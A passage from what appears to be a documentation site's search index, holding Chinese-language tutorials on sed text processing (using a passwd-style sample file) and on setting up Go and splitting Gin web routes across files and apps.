\u6a21\u5f0f\u5339\u914d\u65f6\u7684\u7279\u6b8a\u7b26\u53f7 ^\uff1a\u6bcf\u884c\u7684\u5f00\u5934 \u7ed9\u5168\u6587\u52a0\u6ce8\u91ca [root@shell shelldoc]# sed 's/^/#/' pass \u5728\u7b2c8\u523010\u884c\u7684\u5f00\u5934\u6bcf\u884c\u52a0\u4e0a### [root@shell shelldoc]# sed '8,10s/^/###/' pass $\uff1a\u6bcf\u884c\u7684\u7ed3\u5c3e \u5728\u5339\u914d\u5230root\u7684\u884c\u7684\u672b\u5c3e\u6dfb\u52a0### [root@shell shelldoc]# sed '/root/s/$/###/' pass 1 root:x:0:0:root:/root:/bin/bash### &\uff1a\u5f15\u7528 \u7528\u6765\u4ee3\u66ff\u5339\u914d\u5230\u7684\u6a21\u5f0f\u7684 \u5c06\u6bcf\u4e00\u884c\u7684\u884c\u53f7\u52a0\u4e0a\u62ec\u53f7 [root@shell shelldoc]# sed -r 's/[0-9]+/(&)/' pass [root@shell shelldoc]# cat vtest hello, i like you hi, my love like ==> liker love ==> lover [root@shell shelldoc]# sed 's/l..e/&r/' test hello, i liker you hi, my lover [root@shell shelldoc]# sed -r 's/(l..e)/\\1r/' test hello, i liker you hi, my lover like ==> Like love ==> Love [root@shell shelldoc]# sed -r 's/l(..e)/L\\1/' test hello, i Like you hi, my Love \u200b","title":"11\uff09s   \u67e5\u627e\u66ff\u6362"},{"location":"programming_language/bash_help/sed/sed/#_1","text":"\u200b first~step \u200b first\uff1a\u8d77\u59cb\u884c\u53f7 \u200b step\uff1a\u6b65\u957f \u200b \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# sed -n '2~2p' pass 2 bin:x:1:1:bin:/bin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 8 halt:x:7:0:halt:/sbin:/sbin/halt 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u200b \u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# sed -n '1~3p' pass 1 root:x:0:0:root:/root:/bin/bash 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u200b = \u6253\u5370\u5f53\u524d\u884c\u884c\u53f7 [root@shell shelldoc]# wc -l pass 10 pass \u6253\u5370\u6587\u4ef6\u7684\u884c\u6570 [root@shell shelldoc]# wc -l pass | cut -d\" \" -f1 10 [root@shell shelldoc]# sed -n '$=' pass 10","title":"\u6bcf\u591a\u5c11\u884c\u64cd\u4f5c\u4e00\u6b21"},{"location":"programming_language/bash_help/sed/sed_exd/","text":"\u6a21\u5f0f\u7a7a\u95f4\u548c\u4fdd\u7559\u7a7a\u95f4 \u6a21\u5f0f\u7a7a\u95f4\uff1aPATT \u529f\u80fd\uff1a\u5904\u7406\u6587\u672c\u884c\u7684 \u6700\u591a\u80fd\u4fdd\u5b588KB \u4fdd\u7559\u7a7a\u95f4\uff1aHOLD \u529f\u80fd\uff1a\u4fdd\u7559\u5904\u7406\u8fc7\u7684\u6587\u672c\u884c\u7684\uff0c\u4ee5\u4fbf\u540e\u7eed\u4f7f\u7528 \u9ed8\u8ba4\u6709\u4e00\u4e2a\u7a7a\u884c \u6700\u591a\u80fd\u4fdd\u5b588KB \u547d\u4ee4\uff1a h\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8986\u76d6\u5230\u4fdd\u7559\u7a7a\u95f4 \u2014\u2014 \u8986\u76d6\u6a21\u5f0f H\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u4fdd\u7559\u7a7a\u95f4 \u2014\u2014 \u8ffd\u52a0\u6a21\u5f0f g\uff1a\u5c06\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u8986\u76d6\u5230\u6a21\u5f0f\u7a7a\u95f4 \u2014\u2014 \u8986\u76d6\u6a21\u5f0f G\uff1a\u5c06\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u6a21\u5f0f\u7a7a\u95f4 \u2014\u2014 \u8ffd\u52a0\u6a21\u5f0f x\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u548c\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u4ea4\u6362 exchange \u4f8b\u5b50\uff1a [root@shell shelldoc]# num.txt 1 2 3 4 5 \u7b2c\u4e00\u884c\u548c\u7b2c\u4e8c\u884c\u98a0\u5012\u8f93\u51fa [root@shell shelldoc]# sed '1{h;d};2G' num.txt 2 1 3 4 5 \u7b2c2\u884c\u5230\u7b2c5\u884c\u7684\u5185\u5bb9\u590d\u5236\u5230\u7b2c7\u884c\u4e0b\u9762 [root@shell shelldoc]# sed '2h;3,5H;7G' pass 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u7b2c2\u884c\u5230\u7b2c5\u884c\u7684\u5185\u5bb9\u526a\u5207\u5230\u7b2c7\u884c\u4e0b\u9762 [root@shell shelldoc]# sed '2{h;d};3,5{H;d};7G' pass \u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c [root@shell shelldoc]# sed 'G' num.txt \u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u8f93\u51fa\u4e00\u4e2a\u7a7a\u767d\u884c [root@zed scripts]# sed '/$/a \\ ' pass \u989d\u5916\u7684\uff1a\u6bcf\u884c\u4e0b\u9762\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c\uff0c\u6700\u540e\u4e00\u884c\u4e0b\u9762\u4e0d\u8f93\u51fa [root@shell shelldoc]# sed '$!G' num.txt","title":"\u62d3\u5c55"},{"location":"programming_language/bash_help/sed/sed_exd/#_1","text":"\u6a21\u5f0f\u7a7a\u95f4\uff1aPATT \u529f\u80fd\uff1a\u5904\u7406\u6587\u672c\u884c\u7684 \u6700\u591a\u80fd\u4fdd\u5b588KB \u4fdd\u7559\u7a7a\u95f4\uff1aHOLD \u529f\u80fd\uff1a\u4fdd\u7559\u5904\u7406\u8fc7\u7684\u6587\u672c\u884c\u7684\uff0c\u4ee5\u4fbf\u540e\u7eed\u4f7f\u7528 \u9ed8\u8ba4\u6709\u4e00\u4e2a\u7a7a\u884c \u6700\u591a\u80fd\u4fdd\u5b588KB \u547d\u4ee4\uff1a h\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8986\u76d6\u5230\u4fdd\u7559\u7a7a\u95f4 \u2014\u2014 \u8986\u76d6\u6a21\u5f0f H\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u4fdd\u7559\u7a7a\u95f4 \u2014\u2014 \u8ffd\u52a0\u6a21\u5f0f g\uff1a\u5c06\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u8986\u76d6\u5230\u6a21\u5f0f\u7a7a\u95f4 \u2014\u2014 \u8986\u76d6\u6a21\u5f0f G\uff1a\u5c06\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u6a21\u5f0f\u7a7a\u95f4 \u2014\u2014 \u8ffd\u52a0\u6a21\u5f0f x\uff1a\u5c06\u6a21\u5f0f\u7a7a\u95f4\u7684\u5185\u5bb9\u548c\u4fdd\u7559\u7a7a\u95f4\u7684\u5185\u5bb9\u4ea4\u6362 exchange \u4f8b\u5b50\uff1a [root@shell shelldoc]# num.txt 1 2 3 4 5 \u7b2c\u4e00\u884c\u548c\u7b2c\u4e8c\u884c\u98a0\u5012\u8f93\u51fa [root@shell shelldoc]# sed '1{h;d};2G' num.txt 2 1 3 4 5 \u7b2c2\u884c\u5230\u7b2c5\u884c\u7684\u5185\u5bb9\u590d\u5236\u5230\u7b2c7\u884c\u4e0b\u9762 [root@shell shelldoc]# sed '2h;3,5H;7G' pass 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u7b2c2\u884c\u5230\u7b2c5\u884c\u7684\u5185\u5bb9\u526a\u5207\u5230\u7b2c7\u884c\u4e0b\u9762 [root@shell shelldoc]# sed '2{h;d};3,5{H;d};7G' pass \u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c [root@shell shelldoc]# sed 'G' num.txt \u5728\u6bcf\u884c\u7684\u4e0b\u4e00\u884c\u8f93\u51fa\u4e00\u4e2a\u7a7a\u767d\u884c [root@zed scripts]# sed '/$/a \\ ' pass \u989d\u5916\u7684\uff1a\u6bcf\u884c\u4e0b\u9762\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c\uff0c\u6700\u540e\u4e00\u884c\u4e0b\u9762\u4e0d\u8f93\u51fa [root@shell shelldoc]# sed '$!G' num.txt","title":"\u6a21\u5f0f\u7a7a\u95f4\u548c\u4fdd\u7559\u7a7a\u95f4"},{"location":"programming_language/bash_help/sed/sed_script/","text":"sed\u811a\u672c \u5c06\u5355\u5f15\u53f7\u4e2d\u7684\u5b9a\u5740\u548c\u547d\u4ee4\u5199\u5728\u811a\u672c\u4e2d [root@shell shelldoc]# cat sc1.sed /Lewis/a \\ i am lewis \\ who are you /Suan/c has suan 1i \\ ************\\ begin\\ ************ $d [root@shell shelldoc]# sed -f sc1.sed datafile //\u6267\u884c\u811a\u672c ************ begin ************ northwest NW Charles Main 3.0 .98 34 western WE Sharon Gray 5.3 .97 5 23 southwest SW Lewis Dalsass 2.7 .8 18 i am lewis who are you has suan southeast SE Patricia Hemenway 4.0 .7 17 eastern EA TB Savage 4.4 .84 20 northeast NE AM Main Jr. 5.1 .94 13 western WE Sharon Gray 5.3 .97 5 23 north NO Margot Weber 4.5 .89 9 \u200b \u5e26\u5e7b\u6570\u7684\u811a\u672c [root@shell shelldoc]# sc1.sed #!/bin/sed -f /Lewis/a \\ i am lewis \\ who are you /Suan/c has suan 1i \\ ************ \\ begin \\ ************ $d [root@shell shelldoc]# chmod +x sc1.sed [root@shell shelldoc]# ./sc1.sed datafile \u5047\u8bbe\u811a\u672c\u4e2d\u4f7f\u7528\u4e86\u6269\u5c55\u6b63\u5219\uff0c\u90a3\u4e48\u9009\u9879\u8fd8\u5f97\u52a0-r sed -rf sc2.sed filename #!/bin/sed -rf","title":"sed\u811a\u672c"},{"location":"programming_language/bash_help/sed/sed_script/#sed","text":"\u5c06\u5355\u5f15\u53f7\u4e2d\u7684\u5b9a\u5740\u548c\u547d\u4ee4\u5199\u5728\u811a\u672c\u4e2d [root@shell shelldoc]# cat sc1.sed /Lewis/a \\ i am lewis \\ who are you /Suan/c has suan 1i \\ ************\\ begin\\ ************ $d [root@shell shelldoc]# sed -f sc1.sed datafile //\u6267\u884c\u811a\u672c ************ begin ************ northwest NW Charles Main 3.0 .98 34 western WE Sharon Gray 5.3 .97 5 23 southwest SW Lewis Dalsass 2.7 .8 18 i am lewis who are you has suan southeast SE Patricia Hemenway 4.0 .7 17 eastern EA TB Savage 4.4 .84 20 northeast NE AM Main Jr. 5.1 .94 13 western WE Sharon Gray 5.3 .97 5 23 north NO Margot Weber 4.5 .89 9 \u200b \u5e26\u5e7b\u6570\u7684\u811a\u672c [root@shell shelldoc]# sc1.sed #!/bin/sed -f /Lewis/a \\ i am lewis \\ who are you /Suan/c has suan 1i \\ ************ \\ begin \\ ************ $d [root@shell shelldoc]# chmod +x sc1.sed [root@shell shelldoc]# ./sc1.sed datafile \u5047\u8bbe\u811a\u672c\u4e2d\u4f7f\u7528\u4e86\u6269\u5c55\u6b63\u5219\uff0c\u90a3\u4e48\u9009\u9879\u8fd8\u5f97\u52a0-r sed -rf sc2.sed filename #!/bin/sed -rf","title":"sed\u811a\u672c"},{"location":"programming_language/go/gin__app_route/","text":"Gin \u8def\u7531\u62c6\u5206\u5230\u4e0d\u540c\u7684APP \u6709\u65f6\u5019\u9879\u76ee\u89c4\u6a21\u5b9e\u5728\u592a\u5927\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u66f4\u503e\u5411\u4e8e\u628a\u4e1a\u52a1\u62c6\u5206\u7684\u66f4\u8be6\u7ec6\u4e00\u4e9b\uff0c\u4f8b\u5982\u628a\u4e0d\u540c\u7684\u4e1a\u52a1\u4ee3\u7801\u62c6\u5206\u6210\u4e0d\u540c\u7684APP\u3002 \u56e0\u6b64\u6211\u4eec\u5728\u9879\u76ee\u76ee\u5f55\u4e0b\u5355\u72ec\u5b9a\u4e49\u4e00\u4e2aapp\u76ee\u5f55\uff0c\u7528\u6765\u5b58\u653e\u6211\u4eec\u4e0d\u540c\u4e1a\u52a1\u7ebf\u7684\u4ee3\u7801\u6587\u4ef6\uff0c\u8fd9\u6837\u5c31\u5f88\u5bb9\u6613\u8fdb\u884c\u6a2a\u5411\u6269\u5c55\u3002\u5927\u81f4\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a myapp \u2502 go.mod \u2502 main.go \u251c\u2500app \u2502 \u251c\u2500blog \u2502 \u2502 handler.go \u2502 \u2502 router.go \u2502 \u2502 \u2502 \u2514\u2500shop \u2502 handler.go \u2502 router.go \u2502 \u2514\u2500routers route.go main.go package main import ( \"fmt\" \"myapp/app/blog\" \"myapp/app/shop\" \"myapp/routers\" ) func main() { // \u52a0\u8f7d\u591a\u4e2aAPP\u7684\u8def\u7531\u914d\u7f6e routers.Include(shop.Routers, blog.Routers) // \u521d\u59cb\u5316\u8def\u7531 r := routers.Init() if err := r.Run(); err != nil { fmt.Println(\"startup service failed, err:%v\\n\", err) } } go.mod module myapp go 1.16 require github.com/gin-gonic/gin v1.7.3 route.go package routers import \"github.com/gin-gonic/gin\" type Option func(*gin.Engine) var options = []Option{} // \u6ce8\u518capp\u7684\u8def\u7531\u914d\u7f6e func Include(opts ...Option) { options = append(options, opts...) } // \u521d\u59cb\u5316 func Init() *gin.Engine { r := gin.Default() for _, opt := range options { opt(r) } return r } app/shop/handler.go package shop import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func helloShop(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Shop!\", }) } app/shop/router.go package shop import \"github.com/gin-gonic/gin\" func Routers(e *gin.Engine) { e.GET(\"/shop\", helloShop) } app/blog/handler.go package blog import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func helloBlog(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Blog\", }) } app/blog/router.go package blog import ( \"github.com/gin-gonic/gin\" ) func Routers(e *gin.Engine) { e.GET(\"/Blog\", helloBlog) } \u7136\u540e\u5728\u7ec8\u7aef\u8fd0\u884c D:\\idea\\mygin>go mod tidy \u9879\u76ee\u8fd0\u884c\uff0c\u6216\u8005\u5728goland\u4e2d main.go\u53f3\u952e\u8fd0\u884c D:\\idea\\mygin>go run main.go","title":"Gin \u8def\u7531\u62c6\u5206\u6210\u5355\u72ecAPP"},{"location":"programming_language/go/gin__app_route/#gin-app","text":"\u6709\u65f6\u5019\u9879\u76ee\u89c4\u6a21\u5b9e\u5728\u592a\u5927\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u66f4\u503e\u5411\u4e8e\u628a\u4e1a\u52a1\u62c6\u5206\u7684\u66f4\u8be6\u7ec6\u4e00\u4e9b\uff0c\u4f8b\u5982\u628a\u4e0d\u540c\u7684\u4e1a\u52a1\u4ee3\u7801\u62c6\u5206\u6210\u4e0d\u540c\u7684APP\u3002 \u56e0\u6b64\u6211\u4eec\u5728\u9879\u76ee\u76ee\u5f55\u4e0b\u5355\u72ec\u5b9a\u4e49\u4e00\u4e2aapp\u76ee\u5f55\uff0c\u7528\u6765\u5b58\u653e\u6211\u4eec\u4e0d\u540c\u4e1a\u52a1\u7ebf\u7684\u4ee3\u7801\u6587\u4ef6\uff0c\u8fd9\u6837\u5c31\u5f88\u5bb9\u6613\u8fdb\u884c\u6a2a\u5411\u6269\u5c55\u3002\u5927\u81f4\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a myapp \u2502 go.mod \u2502 main.go \u251c\u2500app \u2502 \u251c\u2500blog \u2502 \u2502 handler.go \u2502 \u2502 router.go \u2502 \u2502 \u2502 \u2514\u2500shop \u2502 handler.go \u2502 router.go \u2502 \u2514\u2500routers route.go main.go package main import ( \"fmt\" \"myapp/app/blog\" \"myapp/app/shop\" \"myapp/routers\" ) func main() { // \u52a0\u8f7d\u591a\u4e2aAPP\u7684\u8def\u7531\u914d\u7f6e routers.Include(shop.Routers, blog.Routers) // \u521d\u59cb\u5316\u8def\u7531 r := routers.Init() if err := r.Run(); err != nil { fmt.Println(\"startup service failed, err:%v\\n\", err) } } go.mod module myapp go 1.16 require github.com/gin-gonic/gin v1.7.3 route.go package routers import \"github.com/gin-gonic/gin\" type Option func(*gin.Engine) var options = []Option{} // \u6ce8\u518capp\u7684\u8def\u7531\u914d\u7f6e func Include(opts ...Option) { options = append(options, opts...) } // \u521d\u59cb\u5316 func Init() *gin.Engine { r := gin.Default() for _, opt := range options { opt(r) } return r } app/shop/handler.go package shop import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func helloShop(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Shop!\", }) } app/shop/router.go package shop import \"github.com/gin-gonic/gin\" func Routers(e *gin.Engine) { e.GET(\"/shop\", helloShop) } app/blog/handler.go package blog import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func helloBlog(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Blog\", }) } app/blog/router.go package blog import ( \"github.com/gin-gonic/gin\" ) func Routers(e *gin.Engine) { e.GET(\"/Blog\", helloBlog) } \u7136\u540e\u5728\u7ec8\u7aef\u8fd0\u884c D:\\idea\\mygin>go mod tidy \u9879\u76ee\u8fd0\u884c\uff0c\u6216\u8005\u5728goland\u4e2d main.go\u53f3\u952e\u8fd0\u884c D:\\idea\\mygin>go run main.go","title":"Gin \u8def\u7531\u62c6\u5206\u5230\u4e0d\u540c\u7684APP"},{"location":"programming_language/go/gin_route/","text":"Go Gin \u8def\u7531\u62c6\u5206\u6210\u5355\u4e2a\u6587\u4ef6 Gin \u8def\u7531\u62c6\u5206\u6210\u591a\u4e2a\u6587\u4ef6\uff0c\u8fd9\u6837\u9002\u5408\u4e2d\u5c0f\u578b\u9879\u76ee mygin \u2502 go.mod \u2502 main.go \u2514\u2500 routers load.go shop.go main.go package main import ( \"fmt\" \"github.com/gin-gonic/gin\" \"mygin/routers\" ) func main() { r := gin.Default() routers.LoadBlog(r) routers.LoadShop(r) if err := r.Run(); err != nil { fmt.Println(\"startup service failed, err:%v\\n\", err) } } load.go package routers import ( \"net/http\" \"github.com/gin-gonic/gin\" ) func helloBlog(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Blog\", }) } func LoadBlog(e *gin.Engine) { e.GET(\"/Blog\", helloBlog) } shop.go package routers import ( \"net/http\" \"github.com/gin-gonic/gin\" ) func helloShop(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Shop!\", }) } func LoadShop(e *gin.Engine) { e.GET(\"/Shop\", helloShop) } go.mod module mygin go 1.16 require github.com/gin-gonic/gin v1.7.3 \u7136\u540e\u5728\u7ec8\u7aef\u8fd0\u884c D:\\idea\\mygin>go mod tidy \u9879\u76ee\u8fd0\u884c\uff0c\u6216\u8005\u5728goland\u4e2d main.go\u53f3\u952e\u8fd0\u884c D:\\idea\\mygin>go run main.go","title":"Gin \u8def\u7531\u62c6\u5206\u6210\u5355\u4e2a\u6587\u4ef6"},{"location":"programming_language/go/gin_route/#go-gin","text":"Gin \u8def\u7531\u62c6\u5206\u6210\u591a\u4e2a\u6587\u4ef6\uff0c\u8fd9\u6837\u9002\u5408\u4e2d\u5c0f\u578b\u9879\u76ee mygin \u2502 go.mod \u2502 main.go \u2514\u2500 routers load.go shop.go main.go package main import ( \"fmt\" \"github.com/gin-gonic/gin\" \"mygin/routers\" ) func main() { r := gin.Default() routers.LoadBlog(r) routers.LoadShop(r) if err := r.Run(); err != nil { fmt.Println(\"startup service failed, err:%v\\n\", err) } } load.go package routers import ( \"net/http\" \"github.com/gin-gonic/gin\" ) func helloBlog(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Blog\", }) } func LoadBlog(e *gin.Engine) { e.GET(\"/Blog\", helloBlog) } shop.go package routers import ( \"net/http\" \"github.com/gin-gonic/gin\" ) func helloShop(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ \"message\": \"Hello Shop!\", }) } func LoadShop(e *gin.Engine) { e.GET(\"/Shop\", helloShop) } go.mod module mygin go 1.16 require github.com/gin-gonic/gin v1.7.3 \u7136\u540e\u5728\u7ec8\u7aef\u8fd0\u884c D:\\idea\\mygin>go mod tidy \u9879\u76ee\u8fd0\u884c\uff0c\u6216\u8005\u5728goland\u4e2d main.go\u53f3\u952e\u8fd0\u884c D:\\idea\\mygin>go run main.go","title":"Go Gin \u8def\u7531\u62c6\u5206\u6210\u5355\u4e2a\u6587\u4ef6"},{"location":"programming_language/go/go_gin/","text":"Go Gin Web\u6846\u67b6\u5165\u95e8 Go\u5b89\u88c5 https://golang.google.cn/dl/ Windows\u5b89\u88c5\u76f4\u63a5\u9009\u62e9go1.16.6.windows-amd64.msi \u5b89\u88c5\u7684\u65f6\u5019\u52fe\u7ebf\u6dfb\u52a0\u73af\u5883\u53d8\u91cf IDEA\u5b89\u88c5 https://www.jetbrains.com/go/ \u8bbe\u7f6e\u6e90 \u5b98\u7f51\u5730\u5740\uff1ahttps://goproxy.io/zh/ 1. \u53f3\u952e \u6211\u7684\u7535\u8111 -> \u5c5e\u6027 -> \u9ad8\u7ea7\u7cfb\u7edf\u8bbe\u7f6e -> \u73af\u5883\u53d8\u91cf 2. \u5728 \u201c[\u4f60\u7684\u7528\u6237\u540d]\u7684\u7528\u6237\u53d8\u91cf\u201d \u4e2d\u70b9\u51fb \u201d\u65b0\u5efa\u201c \u6309\u94ae 3. \u5728 \u201c\u53d8\u91cf\u540d\u201d \u8f93\u5165\u6846\u5e76\u65b0\u589e \u201cGOPROXY\u201d 4. \u5728\u5bf9\u5e94\u7684 \u201c\u53d8\u91cf\u503c\u201d \u8f93\u5165\u6846\u4e2d\u65b0\u589e \u201chttps://goproxy.io,direct\u201d 5. \u6700\u540e\u70b9\u51fb \u201c\u786e\u5b9a\u201d \u6309\u94ae\u4fdd\u5b58\u8bbe\u7f6e \u521b\u5efagin\u9879\u76ee \u7136\u540e\u9879\u76ee\u4e2d\u65b0\u5efamain.go\u6587\u4ef6 package main import \"github.com/gin-gonic/gin\" func main() { r := gin.Default() r.GET(\"/ping\", func(c *gin.Context) { c.JSON(200, gin.H{ \"message\": \"pong\", }) }) r.Run() // listen and serve on 0.0.0.0:8080 (for windows \"localhost:8080\") } \u5728goland\u7ec8\u7aef\u8f93\u5165\u4e0b\u9762\u4ee3\u7801\uff0c\u7f16\u8bd1\u4f9d\u8d56\u5305\uff0c\u4e0b\u8f7d\u5305 D:\\idea\\mygin>go mod edit -require github.com/gin-gonic/gin@latest D:\\idea\\mygin>go mod tidy \u5982\u56fe \u9879\u76ee\u4e2d\u53f3\u952e\u8fd0\u884c\uff0c\u5982\u56fe","title":"Gin\u5165\u95e8"},{"location":"programming_language/go/go_gin/#go-gin-web","text":"Go\u5b89\u88c5 https://golang.google.cn/dl/ Windows\u5b89\u88c5\u76f4\u63a5\u9009\u62e9go1.16.6.windows-amd64.msi \u5b89\u88c5\u7684\u65f6\u5019\u52fe\u7ebf\u6dfb\u52a0\u73af\u5883\u53d8\u91cf IDEA\u5b89\u88c5 https://www.jetbrains.com/go/ \u8bbe\u7f6e\u6e90 \u5b98\u7f51\u5730\u5740\uff1ahttps://goproxy.io/zh/ 1. \u53f3\u952e \u6211\u7684\u7535\u8111 -> \u5c5e\u6027 -> \u9ad8\u7ea7\u7cfb\u7edf\u8bbe\u7f6e -> \u73af\u5883\u53d8\u91cf 2. \u5728 \u201c[\u4f60\u7684\u7528\u6237\u540d]\u7684\u7528\u6237\u53d8\u91cf\u201d \u4e2d\u70b9\u51fb \u201d\u65b0\u5efa\u201c \u6309\u94ae 3. \u5728 \u201c\u53d8\u91cf\u540d\u201d \u8f93\u5165\u6846\u5e76\u65b0\u589e \u201cGOPROXY\u201d 4. \u5728\u5bf9\u5e94\u7684 \u201c\u53d8\u91cf\u503c\u201d \u8f93\u5165\u6846\u4e2d\u65b0\u589e \u201chttps://goproxy.io,direct\u201d 5. \u6700\u540e\u70b9\u51fb \u201c\u786e\u5b9a\u201d \u6309\u94ae\u4fdd\u5b58\u8bbe\u7f6e \u521b\u5efagin\u9879\u76ee \u7136\u540e\u9879\u76ee\u4e2d\u65b0\u5efamain.go\u6587\u4ef6 package main import \"github.com/gin-gonic/gin\" func main() { r := gin.Default() r.GET(\"/ping\", func(c *gin.Context) { c.JSON(200, gin.H{ \"message\": \"pong\", }) }) r.Run() // listen and serve on 0.0.0.0:8080 (for windows \"localhost:8080\") } \u5728goland\u7ec8\u7aef\u8f93\u5165\u4e0b\u9762\u4ee3\u7801\uff0c\u7f16\u8bd1\u4f9d\u8d56\u5305\uff0c\u4e0b\u8f7d\u5305 D:\\idea\\mygin>go mod edit -require github.com/gin-gonic/gin@latest D:\\idea\\mygin>go mod tidy \u5982\u56fe \u9879\u76ee\u4e2d\u53f3\u952e\u8fd0\u884c\uff0c\u5982\u56fe","title":"Go Gin Web\u6846\u67b6\u5165\u95e8"},{"location":"programming_language/go/go_one/","text":"\u5b89\u88c5 Go\u5b89\u88c5 https://golang.google.cn/dl/ Windows\u5b89\u88c5\u76f4\u63a5\u9009\u62e9go1.16.6.windows-amd64.msi \u5b89\u88c5\u7684\u65f6\u5019\u52fe\u7ebf\u6dfb\u52a0\u73af\u5883\u53d8\u91cf IDEA\u5b89\u88c5 https://www.jetbrains.com/go/ \u4e0b\u8f7d\u5b89\u88c5 hello world \u6253\u5f00goland idea \u521b\u5efa\u9879\u76ee\uff0c\u521b\u5efago\u6587\u4ef6 package main import \"fmt\" func main() { fmt.Println(\"Hello, World!\") } \u53f3\u952e--\u300b\u8fd0\u884c \u547d\u4ee4\u884c \u7528git\u5e26\u7684bash \u8fdb\u5165\u9879\u76ee\u76ee\u5f55 \u6267\u884c\u547d\u4ee4 fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ go run one.go Hello, World! fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ go build one.go fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ ls one.exe* one.go fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ ./one.exe Hello, World!","title":"Go\u5165\u95e8"},{"location":"programming_language/go/go_one/#_1","text":"Go\u5b89\u88c5 https://golang.google.cn/dl/ Windows\u5b89\u88c5\u76f4\u63a5\u9009\u62e9go1.16.6.windows-amd64.msi \u5b89\u88c5\u7684\u65f6\u5019\u52fe\u7ebf\u6dfb\u52a0\u73af\u5883\u53d8\u91cf IDEA\u5b89\u88c5 https://www.jetbrains.com/go/ \u4e0b\u8f7d\u5b89\u88c5","title":"\u5b89\u88c5"},{"location":"programming_language/go/go_one/#hello-world","text":"\u6253\u5f00goland idea \u521b\u5efa\u9879\u76ee\uff0c\u521b\u5efago\u6587\u4ef6 package main import \"fmt\" func main() { fmt.Println(\"Hello, World!\") } \u53f3\u952e--\u300b\u8fd0\u884c","title":"hello world"},{"location":"programming_language/go/go_one/#_2","text":"\u7528git\u5e26\u7684bash \u8fdb\u5165\u9879\u76ee\u76ee\u5f55 \u6267\u884c\u547d\u4ee4 fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ go run one.go Hello, World! fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ go build one.go fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ ls one.exe* one.go fugui.wang@wangfuguiK3 MINGW64 /d/idea/go_one $ ./one.exe 